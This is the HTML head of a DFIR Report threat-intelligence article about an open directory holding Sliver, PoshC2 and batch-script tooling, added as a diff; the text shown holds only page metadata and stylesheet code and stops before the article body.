@@ -1,0 +1,2520 @@
+<!DOCTYPE html>
+<html lang="en-US" class="responsive av-preloader-disabled  html_header_top html_logo_left html_main_nav_header html_menu_right html_slim html_header_sticky html_header_shrinking html_mobile_menu_phone html_header_searchicon html_content_align_center html_header_unstick_top_disabled html_header_stretch_disabled html_av-overlay-side html_av-overlay-side-classic html_av-submenu-noclone html_entry_id_37127 av-no-preview av-default-lightbox html_text_menu_active av-mobile-menu-switch-default">
+<head>
+<meta charset="UTF-8" />
+<!-- mobile setting -->
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<!-- Scripts/CSS and wp_head hook -->
+<meta name='robots' content='index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1' />
+
+	<!-- This site is optimized with the Yoast SEO plugin v28.1 - https://yoast.com/product/yoast-seo-wordpress/ -->
+	<title>Threat Actors&#039; Toolkit: Leveraging Sliver, PoshC2 &amp; Batch Scripts - The DFIR Report</title>
+	<link rel="canonical" href="https://thedfirreport.com/2024/08/12/threat-actors-toolkit-leveraging-sliver-poshc2-batch-scripts/" />
+	<meta property="og:locale" content="en_US" />
+	<meta property="og:type" content="article" />
+	<meta property="og:title" content="Threat Actors&#039; Toolkit: Leveraging Sliver, PoshC2 &amp; Batch Scripts - The DFIR Report" />
+	<meta property="og:description" content="Key Takeaways The DFIR Report Services Contact us today for pricing or a demo! Table of Contents: Summary Analysts Adversary Infrastructure Capability Victim Indicators Summary In this report, we delve into an open directory on 94.198.53.143, first observed on December 10, 2023, during our intelligence collection process. Prior to the open directory appearing, this address had [&hellip;]" />
+	<meta property="og:url" content="https://thedfirreport.com/2024/08/12/threat-actors-toolkit-leveraging-sliver-poshc2-batch-scripts/" />
+	<meta property="og:site_name" content="The DFIR Report" />
+	<meta property="article:published_time" content="2024-08-12T01:46:57+00:00" />
+	<meta property="og:image" content="https://thedfirreport.com/wp-content/uploads/26297_011-scaled.png" />
+	<meta property="og:image:width" content="2560" />
+	<meta property="og:image:height" content="1554" />
+	<meta property="og:image:type" content="image/png" />
+	<meta name="author" content="editor" />
+	<meta name="twitter:card" content="summary_large_image" />
+	<meta name="twitter:creator" content="@TheDFIRReport" />
+	<meta name="twitter:site" content="@TheDFIRReport" />
+	<meta name="twitter:label1" content="Written by" />
+	<meta name="twitter:data1" content="editor" />
+	<meta name="twitter:label2" content="Est. reading time" />
+	<meta name="twitter:data2" content="36 minutes" />
+	<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https:\/\/schema.org","@graph":[{"@type":"Article","@id":"https:\/\/thedfirreport.com\/2024\/08\/12\/threat-actors-toolkit-leveraging-sliver-poshc2-batch-scripts\/#article","isPartOf":{"@id":"https:\/\/thedfirreport.com\/2024\/08\/12\/threat-actors-toolkit-leveraging-sliver-poshc2-batch-scripts\/"},"author":{"name":"editor","@id":"https:\/\/thedfirreport.com\/#\/schema\/person\/da9637fd0bc34ae15034d826285864c5"},"headline":"Threat Actors' Toolkit: Leveraging Sliver, PoshC2 &#038; Batch Scripts","datePublished":"2024-08-12T01:46:57+00:00","mainEntityOfPage":{"@id":"https:\/\/thedfirreport.com\/2024\/08\/12\/threat-actors-toolkit-leveraging-sliver-poshc2-batch-scripts\/"},"wordCount":5621,"publisher":{"@id":"https:\/\/thedfirreport.com\/#organization"},"image":{"@id":"https:\/\/thedfirreport.com\/2024\/08\/12\/threat-actors-toolkit-leveraging-sliver-poshc2-batch-scripts\/#primaryimage"},"thumbnailUrl":"https:\/\/thedfirreport.com\/wp-content\/uploads\/26297_011-scaled.png","articleSection":["opendir"],"inLanguage":"en-US"},{"@type":"WebPage","@id":"https:\/\/thedfirreport.com\/2024\/08\/12\/threat-actors-toolkit-leveraging-sliver-poshc2-batch-scripts\/","url":"https:\/\/thedfirreport.com\/2024\/08\/12\/threat-actors-toolkit-leveraging-sliver-poshc2-batch-scripts\/","name":"Threat Actors' Toolkit: Leveraging Sliver, PoshC2 & Batch Scripts - The DFIR Report","isPartOf":{"@id":"https:\/\/thedfirreport.com\/#website"},"primaryImageOfPage":{"@id":"https:\/\/thedfirreport.com\/2024\/08\/12\/threat-actors-toolkit-leveraging-sliver-poshc2-batch-scripts\/#primaryimage"},"image":{"@id":"https:\/\/thedfirreport.com\/2024\/08\/12\/threat-actors-toolkit-leveraging-sliver-poshc2-batch-scripts\/#primaryimage"},"thumbnailUrl":"https:\/\/thedfirreport.com\/wp-content\/uploads\/26297_011-scaled.png","datePublished":"2024-08-12T01:46:57+00:00","breadcrumb":{"@id":"https:\/\/thedfirreport.com\/2024\/08\/12\/threat-actors-toolkit-leveraging-sliver-poshc2-batch-scripts\/#breadcrumb"},"inLanguage":"en-US","potentialAction":[{"@type":"ReadAction","target":["https:\/\/thedfirreport.com\/2024\/08\/12\/threat-actors-toolkit-leveraging-sliver-poshc2-batch-scripts\/"]}]},{"@type":"ImageObject","inLanguage":"en-US","@id":"https:\/\/thedfirreport.com\/2024\/08\/12\/threat-actors-toolkit-leveraging-sliver-poshc2-batch-scripts\/#primaryimage","url":"https:\/\/thedfirreport.com\/wp-content\/uploads\/26297_011-scaled.png","contentUrl":"https:\/\/thedfirreport.com\/wp-content\/uploads\/26297_011-scaled.png","width":2560,"height":1554},{"@type":"BreadcrumbList","@id":"https:\/\/thedfirreport.com\/2024\/08\/12\/threat-actors-toolkit-leveraging-sliver-poshc2-batch-scripts\/#breadcrumb","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https:\/\/thedfirreport.com\/home\/"},{"@type":"ListItem","position":2,"name":"Threat Actors' Toolkit: Leveraging Sliver, PoshC2 &#038; Batch Scripts"}]},{"@type":"WebSite","@id":"https:\/\/thedfirreport.com\/#website","url":"https:\/\/thedfirreport.com\/","name":"The DFIR Report","description":"Actionable Cyber Threat Intelligence","publisher":{"@id":"https:\/\/thedfirreport.com\/#organization"},"potentialAction":[{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https:\/\/thedfirreport.com\/?s={search_term_string}"},"query-input":{"@type":"PropertyValueSpecification","valueRequired":true,"valueName":"search_term_string"}}],"inLanguage":"en-US"},{"@type":"Organization","@id":"https:\/\/thedfirreport.com\/#organization","name":"The DFIR Report","url":"https:\/\/thedfirreport.com\/","logo":{"@type":"ImageObject","inLanguage":"en-US","@id":"https:\/\/thedfirreport.com\/#\/schema\/logo\/image\/","url":"https:\/\/thedfirreport.com\/wp-content\/uploads\/DFIR-Featured-Image-696x696-1.jpg","contentUrl":"https:\/\/thedfirreport.com\/wp-content\/uploads\/DFIR-Featured-Image-696x696-1.jpg","width":696,"height":696,"caption":"The DFIR Report"},"image":{"@id":"https:\/\/thedfirreport.com\/#\/schema\/logo\/image\/"},"sameAs":["https:\/\/x.com\/TheDFIRReport","https:\/\/www.linkedin.com\/company\/the-dfir-report"]},{"@type":"Person","@id":"https:\/\/thedfirreport.com\/#\/schema\/person\/da9637fd0bc34ae15034d826285864c5","name":"editor","image":{"@type":"ImageObject","inLanguage":"en-US","@id":"https:\/\/secure.gravatar.com\/avatar\/449f7a28a483cb14f475494cbc5a0eb3b2c399451d1bdb62e0e315bf20a2ca9c?s=96&d=mm&r=g","url":"https:\/\/secure.gravatar.com\/avatar\/449f7a28a483cb14f475494cbc5a0eb3b2c399451d1bdb62e0e315bf20a2ca9c?s=96&d=mm&r=g","contentUrl":"https:\/\/secure.gravatar.com\/avatar\/449f7a28a483cb14f475494cbc5a0eb3b2c399451d1bdb62e0e315bf20a2ca9c?s=96&d=mm&r=g","caption":"editor"}}]}</script>
+	<!-- / Yoast SEO plugin. -->
+
+
+<link rel='dns-prefetch' href='//fonts.googleapis.com' />
+<link rel="alternate" type="application/rss+xml" title="The DFIR Report &raquo; Feed" href="https://thedfirreport.com/feed/" />
+<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://thedfirreport.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fthedfirreport.com%2F2024%2F08%2F12%2Fthreat-actors-toolkit-leveraging-sliver-poshc2-batch-scripts%2F" />
+<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://thedfirreport.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fthedfirreport.com%2F2024%2F08%2F12%2Fthreat-actors-toolkit-leveraging-sliver-poshc2-batch-scripts%2F&#038;format=xml" />
+<link rel='stylesheet' id='avia-grid-css' href='https://thedfirreport.com/wp-content/themes/punch/assets/css/grid.css?ver=1.0.96' media='all' />
+<link rel='stylesheet' id='avia-base-css' href='https://thedfirreport.com/wp-content/themes/punch/assets/css/base.css?ver=1.0.96' media='all' />
+<link rel='stylesheet' id='avia-layout-css' href='https://thedfirreport.com/wp-content/themes/punch/assets/css/layout.css?ver=1.0.96' media='all' />
+<link rel='stylesheet' id='avia-module-button-css' href='https://thedfirreport.com/wp-content/themes/punch/assets/css/shortcodes/buttons.css?ver=1.0.94' media='' />
+<link rel='stylesheet' id='avia-module-button-buttonrow-css' href='https://thedfirreport.com/wp-content/themes/punch/assets/css/shortcodes/buttonrow.css?ver=1.0.94' media='' />
+<link rel='stylesheet' id='avia-scs-css' href='https://thedfirreport.com/wp-content/themes/punch/assets/css/shortcodes.css?ver=1.0.96' media='all' />
+<link rel='stylesheet' id='avia-module-ep-flickity-slider-css' href='https://thedfirreport.com/wp-content/themes/punch/assets/css/ep-flickity-sliders.css?ver=1.0.94' media='all' />
+<link rel='stylesheet' id='avia-module-custom-menu-css' href='https://thedfirreport.com/wp-content/themes/punch/assets/css/shortcodes/custom-menu.css?ver=1.0.94' media='' />
+<link rel='stylesheet' id='avia-module-heading-css' href='https://thedfirreport.com/wp-content/themes/punch/assets/css/shortcodes/heading.css?ver=1.0.94' media='' />
+<link rel='stylesheet' id='avia-module-hr-css' href='https://thedfirreport.com/wp-content/themes/punch/assets/css/shortcodes/hr.css?ver=1.0.94' media='' />
+<link rel='stylesheet' id='avia-module-icon-css' href='https://thedfirreport.com/wp-content/themes/punch/assets/css/shortcodes/icon.css?ver=1.0.94' media='' />
+<link rel='stylesheet' id='avia-module-image-css' href='https://thedfirreport.com/wp-content/themes/punch/assets/css/shortcodes/image.css?ver=1.0.94' media='' />
+<link rel='stylesheet' id='avia-module-ep-grids-css' href='https://thedfirreport.com/wp-content/themes/punch/assets/css/grids.css?ver=1.0.94' media='all' />
+<link rel='stylesheet' id='avia-module-ep-item-grid-css' href='https://thedfirreport.com/wp-content/themes/punch/assets/css/shortcodes/item-grid.css?ver=1.0.94' media='all' />
+<link rel='stylesheet' id='avia-module-ep-post-grid-css' href='https://thedfirreport.com/wp-content/themes/punch/assets/css/shortcodes/posts-grid.css?ver=1.0.94' media='all' />
+<link rel='stylesheet' id='avia-module-ep-social-profiles-css' href='https://thedfirreport.com/wp-content/themes/punch/assets/css/shortcodes/social-profiles.css?ver=1.0.94' media='' />
+<link rel='stylesheet' id='avia-module-ep-split-heading-css' href='https://thedfirreport.com/wp-content/themes/punch/assets/css/shortcodes/split-heading.css?ver=1.0.94' media='all' />
+<link rel='stylesheet' id='avia-module-textblock-css' href='https://thedfirreport.com/wp-content/themes/punch/assets/css/shortcodes/textblock.css?ver=1.0.94' media='' />
+<link rel='stylesheet' id='avia-module-video-css' href='https://thedfirreport.com/wp-content/themes/punch/config-templatebuilder/avia-shortcodes/video/video.css?ver=1.0.96' media='all' />
+<link rel='stylesheet' id='avia-module-ep-section-css' href='https://thedfirreport.com/wp-content/themes/punch/assets/css/shortcodes/section.css?ver=1.0.94' media='' />
+<style id="wp-emoji-styles-inline-css">
+
+	img.wp-smiley, img.emoji {
+		display: inline !important;
+		border: none !important;
+		box-shadow: none !important;
+		height: 1em !important;
+		width: 1em !important;
+		margin: 0 0.07em !important;
+		vertical-align: -0.1em !important;
+		background: none !important;
+		padding: 0 !important;
+	}
+/*# sourceURL=wp-emoji-styles-inline-css */
+</style>
+<style id="wp-block-library-inline-css">
+:root{--wp-block-synced-color:#7a00df;--wp-block-synced-color--rgb:122,0,223;--wp-bound-block-color:var(--wp-block-synced-color);--wp-editor-canvas-background:#ddd;--wp-admin-theme-color:#007cba;--wp-admin-theme-color--rgb:0,124,186;--wp-admin-theme-color-darker-10:#006ba1;--wp-admin-theme-color-darker-10--rgb:0,107,160.5;--wp-admin-theme-color-darker-20:#005a87;--wp-admin-theme-color-darker-20--rgb:0,90,135;--wp-admin-border-width-focus:2px}@media (min-resolution:192dpi){:root{--wp-admin-border-width-focus:1.5px}}.wp-element-button{cursor:pointer}:root .has-very-light-gray-background-color{background-color:#eee}:root .has-very-dark-gray-background-color{background-color:#313131}:root .has-very-light-gray-color{color:#eee}:root .has-very-dark-gray-color{color:#313131}:root .has-vivid-green-cyan-to-vivid-cyan-blue-gradient-background{background:linear-gradient(135deg,#00d084,#0693e3)}:root .has-purple-crush-gradient-background{background:linear-gradient(135deg,#34e2e4,#4721fb 50%,#ab1dfe)}:root .has-hazy-dawn-gradient-background{background:linear-gradient(135deg,#faaca8,#dad0ec)}:root .has-subdued-olive-gradient-background{background:linear-gradient(135deg,#fafae1,#67a671)}:root .has-atomic-cream-gradient-background{background:linear-gradient(135deg,#fdd79a,#004a59)}:root .has-nightshade-gradient-background{background:linear-gradient(135deg,#330968,#31cdcf)}:root .has-midnight-gradient-background{background:linear-gradient(135deg,#020381,#2874fc)}:root{--wp--preset--font-size--normal:16px;--wp--preset--font-size--huge:42px}.has-regular-font-size{font-size:1em}.has-larger-font-size{font-size:2.625em}.has-normal-font-size{font-size:var(--wp--preset--font-size--normal)}.has-huge-font-size{font-size:var(--wp--preset--font-size--huge)}:root .has-text-align-center{text-align:center}:root .has-text-align-left{text-align:left}:root .has-text-align-right{text-align:right}.has-fit-text{white-space:nowrap!important}#end-resizable-editor-section{display:none}.aligncenter{clear:both}.items-justified-left{justify-content:flex-start}.items-justified-center{justify-content:center}.items-justified-right{justify-content:flex-end}.items-justified-space-between{justify-content:space-between}.screen-reader-text{word-wrap:normal!important;border:0;clip-path:inset(50%);height:1px;margin:-1px;overflow:hidden;padding:0;position:absolute;width:1px}.screen-reader-text:focus{background-color:#ddd;clip-path:none;color:#444;display:block;font-size:1em;height:auto;left:5px;line-height:normal;padding:15px 23px 14px;text-decoration:none;top:5px;width:auto;z-index:100000}html :where(.has-border-color){border-style:solid}html :where([style*=border-color]){border-style:solid}html :where([style*=border-top-color]){border-top-style:solid}html :where([style*=border-right-color]){border-right-style:solid}html :where([style*=border-bottom-color]){border-bottom-style:solid}html :where([style*=border-left-color]){border-left-style:solid}html :where([style*=border-width]){border-style:solid}html :where([style*=border-top-width]){border-top-style:solid}html :where([style*=border-right-width]){border-right-style:solid}html :where([style*=border-bottom-width]){border-bottom-style:solid}html :where([style*=border-left-width]){border-left-style:solid}html :where(img[class*=wp-image-]){height:auto;max-width:100%}:where(figure){margin:0 0 1em}html :where(.is-position-sticky){--wp-admin--admin-bar--position-offset:var(--wp-admin--admin-bar--height,0px)}@media screen and (max-width:600px){html :where(.is-position-sticky){--wp-admin--admin-bar--position-offset:0px}}
+
+/*# sourceURL=/wp-includes/css/dist/block-library/common.min.css */
+</style>
+<style id="wp-block-image-inline-css">
+.wp-block-image>a,.wp-block-image>figure>a{display:inline-block}.wp-block-image img{box-sizing:border-box;height:auto;max-width:100%;vertical-align:bottom}@media not (prefers-reduced-motion){.wp-block-image img.hide{visibility:hidden}.wp-block-image img.show{animation:show-content-image .4s}}.wp-block-image[style*=border-radius] img,.wp-block-image[style*=border-radius]>a{border-radius:inherit}.wp-block-image.has-custom-border img{box-sizing:border-box}.wp-block-image.aligncenter{text-align:center}.wp-block-image.alignfull>a,.wp-block-image.alignwide>a{width:100%}.wp-block-image.alignfull img,.wp-block-image.alignwide img{height:auto;width:100%}.wp-block-image .aligncenter,.wp-block-image .alignleft,.wp-block-image .alignright,.wp-block-image.aligncenter,.wp-block-image.alignleft,.wp-block-image.alignright{display:table}.wp-block-image .aligncenter>figcaption,.wp-block-image .alignleft>figcaption,.wp-block-image .alignright>figcaption,.wp-block-image.aligncenter>figcaption,.wp-block-image.alignleft>figcaption,.wp-block-image.alignright>figcaption{caption-side:bottom;display:table-caption}.wp-block-image .alignleft{float:left;margin:.5em 1em .5em 0}.wp-block-image .alignright{float:right;margin:.5em 0 .5em 1em}.wp-block-image .aligncenter{margin-left:auto;margin-right:auto}.wp-block-image :where(figcaption){margin-bottom:1em;margin-top:.5em}.wp-block-image.is-style-circle-mask img{border-radius:9999px}@supports ((-webkit-mask-image:none) or (mask-image:none)) or (-webkit-mask-image:none){.wp-block-image.is-style-circle-mask img{border-radius:0;-webkit-mask-image:url('data:image/svg+xml;utf8,<svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg"><circle cx="50" cy="50" r="50"/></svg>');mask-image:url('data:image/svg+xml;utf8,<svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg"><circle cx="50" cy="50" r="50"/></svg>');mask-mode:alpha;-webkit-mask-position:center;mask-position:center;-webkit-mask-repeat:no-repeat;mask-repeat:no-repeat;-webkit-mask-size:contain;mask-size:contain}}:root :where(.wp-block-image.is-style-rounded img,.wp-block-image .is-style-rounded img){border-radius:9999px}.wp-block-image figure{margin:0}.wp-lightbox-container{display:flex;flex-direction:column;position:relative}.wp-lightbox-container img{cursor:zoom-in}.wp-lightbox-container img:hover+button{opacity:1}.wp-lightbox-container button{align-items:center;backdrop-filter:blur(16px) saturate(180%);background-color:#5a5a5a40;border:none;border-radius:4px;cursor:zoom-in;display:flex;height:20px;justify-content:center;opacity:0;padding:0;position:absolute;right:16px;text-align:center;top:16px;width:20px;z-index:100}@media not (prefers-reduced-motion){.wp-lightbox-container button{transition:opacity .2s ease}}.wp-lightbox-container button:focus-visible{outline:3px auto #5a5a5a40;outline:3px auto -webkit-focus-ring-color;outline-offset:3px}.wp-lightbox-container button:hover{cursor:pointer;opacity:1}.wp-lightbox-container button:focus{opacity:1}.wp-lightbox-container button:focus,.wp-lightbox-container button:hover,.wp-lightbox-container button:not(:hover):not(:active):not(.has-background){background-color:#5a5a5a40;border:none}.wp-lightbox-overlay{box-sizing:border-box;cursor:zoom-out;height:100vh;left:0;overflow:hidden;position:fixed;top:0;visibility:hidden;width:100%;z-index:100000}.wp-lightbox-overlay .wp-lightbox-close-button{align-items:center;cursor:pointer;display:flex;font-family:inherit;gap:8px;justify-content:center;line-height:1;min-height:40px;min-width:40px;padding:0 4px;position:absolute;right:calc(env(safe-area-inset-right) + 16px);top:calc(env(safe-area-inset-top) + 16px);z-index:5000000}.wp-lightbox-overlay .wp-lightbox-close-button:focus,.wp-lightbox-overlay .wp-lightbox-close-button:hover,.wp-lightbox-overlay .wp-lightbox-close-button:not(:hover):not(:active):not(.has-background){background:none;border:none}.wp-lightbox-overlay .wp-lightbox-close-button:has(.wp-lightbox-close-text:not([hidden])) .wp-lightbox-close-icon svg{height:1em;width:1em}.wp-lightbox-overlay .wp-lightbox-close-icon svg{display:block}.wp-lightbox-overlay .wp-lightbox-navigation-button-next,.wp-lightbox-overlay .wp-lightbox-navigation-button-prev{align-items:center;bottom:16px;cursor:pointer;display:flex;font-family:inherit;gap:4px;justify-content:center;line-height:1;min-height:40px;min-width:40px;padding:0 8px;position:absolute;z-index:2000002}.wp-lightbox-overlay .wp-lightbox-navigation-button-next[hidden],.wp-lightbox-overlay .wp-lightbox-navigation-button-prev[hidden]{display:none}@media (min-width:960px){.wp-lightbox-overlay .wp-lightbox-navigation-button-next,.wp-lightbox-overlay .wp-lightbox-navigation-button-prev{bottom:50%;transform:translateY(-50%)}}.wp-lightbox-overlay .wp-lightbox-navigation-button-next:focus,.wp-lightbox-overlay .wp-lightbox-navigation-button-next:hover,.wp-lightbox-overlay .wp-lightbox-navigation-button-next:not(:hover):not(:active):not(.has-background),.wp-lightbox-overlay .wp-lightbox-navigation-button-prev:focus,.wp-lightbox-overlay .wp-lightbox-navigation-button-prev:hover,.wp-lightbox-overlay .wp-lightbox-navigation-button-prev:not(:hover):not(:active):not(.has-background){background:none;border:none;padding:0 8px}.wp-lightbox-overlay .wp-lightbox-navigation-button-next:has(.wp-lightbox-navigation-text:not([hidden])) .wp-lightbox-navigation-icon svg,.wp-lightbox-overlay .wp-lightbox-navigation-button-prev:has(.wp-lightbox-navigation-text:not([hidden])) .wp-lightbox-navigation-icon svg{display:block;height:1.5em;width:1.5em}.wp-lightbox-overlay .wp-lightbox-navigation-button-prev{left:calc(env(safe-area-inset-left) + 16px)}.wp-lightbox-overlay .wp-lightbox-navigation-button-next{right:calc(env(safe-area-inset-right) + 16px)}.wp-lightbox-overlay .wp-lightbox-navigation-icon svg{vertical-align:middle}.wp-lightbox-overlay .lightbox-image-container{height:var(--wp--lightbox-container-height);left:50%;overflow:hidden;position:absolute;top:50%;transform:translate(-50%,-50%);transform-origin:top left;width:var(--wp--lightbox-container-width);z-index:2000001}.wp-lightbox-overlay .wp-block-image{align-items:center;box-sizing:border-box;display:flex;height:100%;justify-content:center;margin:0;position:relative;transform-origin:0 0;width:100%;z-index:3000000}.wp-lightbox-overlay .wp-block-image img{height:var(--wp--lightbox-image-height);min-height:var(--wp--lightbox-image-height);min-width:var(--wp--lightbox-image-width);width:var(--wp--lightbox-image-width)}.wp-lightbox-overlay .wp-block-image figcaption{display:none}.wp-lightbox-overlay button{background:none;border:none}.wp-lightbox-overlay .scrim{background-color:#fff;height:100%;opacity:.9;position:absolute;width:100%;z-index:2000000}.wp-lightbox-overlay.active{visibility:visible}@media not (prefers-reduced-motion){.wp-lightbox-overlay.active{animation:turn-on-visibility .25s both}.wp-lightbox-overlay.active img{animation:turn-on-visibility .35s both}.wp-lightbox-overlay.show-closing-animation:not(.active){animation:turn-off-visibility .35s both}.wp-lightbox-overlay.show-closing-animation:not(.active) img{animation:turn-off-visibility .25s both}.wp-lightbox-overlay.zoom.active{animation:none;opacity:1;visibility:visible}.wp-lightbox-overlay.zoom.active .lightbox-image-container{animation:lightbox-zoom-in .4s}.wp-lightbox-overlay.zoom.active .lightbox-image-container img{animation:none}.wp-lightbox-overlay.zoom.active .scrim{animation:turn-on-visibility .4s forwards}.wp-lightbox-overlay.zoom.show-closing-animation:not(.active){animation:none}.wp-lightbox-overlay.zoom.show-closing-animation:not(.active) .lightbox-image-container{animation:lightbox-zoom-out .4s}.wp-lightbox-overlay.zoom.show-closing-animation:not(.active) .lightbox-image-container img{animation:none}.wp-lightbox-overlay.zoom.show-closing-animation:not(.active) .scrim{animation:turn-off-visibility .4s forwards}}@keyframes show-content-image{0%{visibility:hidden}99%{visibility:hidden}to{visibility:visible}}@keyframes turn-on-visibility{0%{opacity:0}to{opacity:1}}@keyframes turn-off-visibility{0%{opacity:1;visibility:visible}99%{opacity:0;visibility:visible}to{opacity:0;visibility:hidden}}@keyframes lightbox-zoom-in{0%{transform:translate(calc((-100vw + var(--wp--lightbox-scrollbar-width))/2 + var(--wp--lightbox-initial-left-position)),calc(-50vh + var(--wp--lightbox-initial-top-position))) scale(var(--wp--lightbox-scale))}to{transform:translate(-50%,-50%) scale(1)}}@keyframes lightbox-zoom-out{0%{transform:translate(-50%,-50%) scale(1);visibility:visible}99%{visibility:visible}to{transform:translate(calc((-100vw + var(--wp--lightbox-scrollbar-width))/2 + var(--wp--lightbox-initial-left-position)),calc(-50vh + var(--wp--lightbox-initial-top-position))) scale(var(--wp--lightbox-scale));visibility:hidden}}
+/*# sourceURL=https://thedfirreport.com/wp-includes/blocks/image/style.min.css */
+</style>
+<style id="wp-block-list-inline-css">
+ol,ul{box-sizing:border-box}:root :where(.wp-block-list.has-background){padding:1.25em 2.375em}
+/*# sourceURL=https://thedfirreport.com/wp-includes/blocks/list/style.min.css */
+</style>
+<style id="wp-block-embed-inline-css">
+.wp-block-embed.alignleft,.wp-block-embed.alignright,.wp-block[data-align=left]>[data-type="core/embed"],.wp-block[data-align=right]>[data-type="core/embed"]{max-width:360px;width:100%}.wp-block-embed.alignleft .wp-block-embed__wrapper,.wp-block-embed.alignright .wp-block-embed__wrapper,.wp-block[data-align=left]>[data-type="core/embed"] .wp-block-embed__wrapper,.wp-block[data-align=right]>[data-type="core/embed"] .wp-block-embed__wrapper{min-width:280px}.wp-block-cover .wp-block-embed{min-height:240px;min-width:320px}.wp-block-group.is-layout-flex .wp-block-embed{flex:1 1 0%;min-width:0}.wp-block-embed{overflow-wrap:break-word}.wp-block-embed :where(figcaption){margin-bottom:1em;margin-top:.5em}.wp-block-embed iframe{max-width:100%}.wp-block-embed__wrapper{position:relative}.wp-embed-responsive .wp-has-aspect-ratio .wp-block-embed__wrapper:before{content:"";display:block;padding-top:50%}.wp-embed-responsive .wp-has-aspect-ratio iframe{bottom:0;height:100%;left:0;position:absolute;right:0;top:0;width:100%}.wp-embed-responsive .wp-embed-aspect-21-9 .wp-block-embed__wrapper:before{padding-top:42.85%}.wp-embed-responsive .wp-embed-aspect-18-9 .wp-block-embed__wrapper:before{padding-top:50%}.wp-embed-responsive .wp-embed-aspect-16-9 .wp-block-embed__wrapper:before{padding-top:56.25%}.wp-embed-responsive .wp-embed-aspect-4-3 .wp-block-embed__wrapper:before{padding-top:75%}.wp-embed-responsive .wp-embed-aspect-1-1 .wp-block-embed__wrapper:before{padding-top:100%}.wp-embed-responsive .wp-embed-aspect-9-16 .wp-block-embed__wrapper:before{padding-top:177.77%}.wp-embed-responsive .wp-embed-aspect-1-2 .wp-block-embed__wrapper:before{padding-top:200%}
+/*# sourceURL=https://thedfirreport.com/wp-includes/blocks/embed/style.min.css */
+</style>
+<style id="wp-block-table-inline-css">
+.wp-block-table{overflow-x:auto}.wp-block-table table{border-collapse:collapse;width:100%}.wp-block-table thead{border-bottom:3px solid}.wp-block-table tfoot{border-top:3px solid}.wp-block-table td,.wp-block-table th{border:1px solid;padding:.5em}.wp-block-table .has-fixed-layout{table-layout:fixed;width:100%}.wp-block-table .has-fixed-layout td,.wp-block-table .has-fixed-layout th{word-break:break-word}.wp-block-table.aligncenter,.wp-block-table.alignleft,.wp-block-table.alignright{display:table;width:auto}.wp-block-table.aligncenter td,.wp-block-table.aligncenter th,.wp-block-table.alignleft td,.wp-block-table.alignleft th,.wp-block-table.alignright td,.wp-block-table.alignright th{word-break:break-word}.wp-block-table .has-subtle-light-gray-background-color{background-color:#f3f4f5}.wp-block-table .has-subtle-pale-green-background-color{background-color:#e9fbe5}.wp-block-table .has-subtle-pale-blue-background-color{background-color:#e7f5fe}.wp-block-table .has-subtle-pale-pink-background-color{background-color:#fcf0ef}.wp-block-table.is-style-stripes{background-color:initial;border-collapse:inherit;border-spacing:0}.wp-block-table.is-style-stripes tbody tr:nth-child(odd){background-color:#f0f0f0}.wp-block-table.is-style-stripes.has-subtle-light-gray-background-color tbody tr:nth-child(odd){background-color:#f3f4f5}.wp-block-table.is-style-stripes.has-subtle-pale-green-background-color tbody tr:nth-child(odd){background-color:#e9fbe5}.wp-block-table.is-style-stripes.has-subtle-pale-blue-background-color tbody tr:nth-child(odd){background-color:#e7f5fe}.wp-block-table.is-style-stripes.has-subtle-pale-pink-background-color tbody tr:nth-child(odd){background-color:#fcf0ef}.wp-block-table.is-style-stripes td,.wp-block-table.is-style-stripes th{border-color:#0000}.wp-block-table.is-style-stripes{border-bottom:1px solid #f0f0f0}.wp-block-table .has-border-color td,.wp-block-table .has-border-color th,.wp-block-table .has-border-color tr,.wp-block-table .has-border-color>*{border-color:inherit}.wp-block-table table[style*=border-top-color] tr:first-child,.wp-block-table table[style*=border-top-color] tr:first-child td,.wp-block-table table[style*=border-top-color] tr:first-child th,.wp-block-table table[style*=border-top-color]>*,.wp-block-table table[style*=border-top-color]>* td,.wp-block-table table[style*=border-top-color]>* th{border-top-color:inherit}.wp-block-table table[style*=border-top-color] tr:not(:first-child){border-top-color:initial}.wp-block-table table[style*=border-right-color] td:last-child,.wp-block-table table[style*=border-right-color] th,.wp-block-table table[style*=border-right-color] tr,.wp-block-table table[style*=border-right-color]>*{border-right-color:inherit}.wp-block-table table[style*=border-bottom-color] tr:last-child,.wp-block-table table[style*=border-bottom-color] tr:last-child td,.wp-block-table table[style*=border-bottom-color] tr:last-child th,.wp-block-table table[style*=border-bottom-color]>*,.wp-block-table table[style*=border-bottom-color]>* td,.wp-block-table table[style*=border-bottom-color]>* th{border-bottom-color:inherit}.wp-block-table table[style*=border-bottom-color] tr:not(:last-child){border-bottom-color:initial}.wp-block-table table[style*=border-left-color] td:first-child,.wp-block-table table[style*=border-left-color] th,.wp-block-table table[style*=border-left-color] tr,.wp-block-table table[style*=border-left-color]>*{border-left-color:inherit}.wp-block-table table[style*=border-style] td,.wp-block-table table[style*=border-style] th,.wp-block-table table[style*=border-style] tr,.wp-block-table table[style*=border-style]>*{border-style:inherit}.wp-block-table table[style*=border-width] td,.wp-block-table table[style*=border-width] th,.wp-block-table table[style*=border-width] tr,.wp-block-table table[style*=border-width]>*{border-style:inherit;border-width:inherit}
+/*# sourceURL=https://thedfirreport.com/wp-includes/blocks/table/style.min.css */
+</style>
+
+
+<style id="global-styles-inline-css">
